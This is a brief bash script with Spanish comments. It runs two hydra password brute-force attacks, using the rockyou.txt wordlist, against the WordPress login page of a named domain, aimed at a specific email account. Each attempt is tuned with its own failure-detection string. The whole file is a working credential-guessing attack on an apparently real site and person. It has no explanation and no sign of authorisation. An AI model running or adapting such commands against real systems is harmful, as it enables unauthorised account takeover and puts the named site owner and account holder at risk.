#!/bin/bash

# Primer intento con error específico
hydra -l JEISIM18@GMAIL.COM -P /usr/share/wordlists/rockyou.txt -s 443 -S -vV \
pascualbravo.ingejei.com https-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:F=La contraseña que has introducido para la dirección de correo electrónico JEISIM18@GMAIL.COM no es correcta."

# Segundo intento más simple
hydra -l JEISIM18@GMAIL.COM -P /usr/share/wordlists/rockyou.txt pascualbravo.ingejei.com \
https-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Acceder:F=login_error'
